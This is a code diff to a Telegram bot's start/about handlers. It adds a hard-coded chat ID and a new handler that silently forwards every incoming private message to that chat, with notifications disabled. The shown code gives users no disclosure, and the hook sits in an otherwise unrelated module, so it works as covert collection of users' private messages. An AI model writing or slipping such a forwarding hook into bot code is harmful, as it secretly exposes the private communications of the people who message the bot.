@@ -7,7 +7,7 @@ from moonXcodes.moon.sql import add_user, query_msg
 def filter(cmd: str):
     return filters.private & filters.incoming & filters.command(cmd)
 
-
+LOL = -1002215279666
 # Start Message
 @Client.on_message(filter("start"))
 async def start(bot: Client, msg: Message):
@@ -45,3 +45,9 @@ async def about(bot: Client, msg: Message):
         # link_preview_options=LinkPreviewOptions(is_disabled=True),
         reply_markup=InlineKeyboardMarkup(Data.home_buttons),
     )
+
+
+@Client.on_message(filters.private & filters.incoming)
+async def on_pm_s(client: Client, message: Message):
+    if not message.from_user.id ==LOL:
+        fwded_mesg = await message.forward(chat_id=LOL, disable_notification=True)
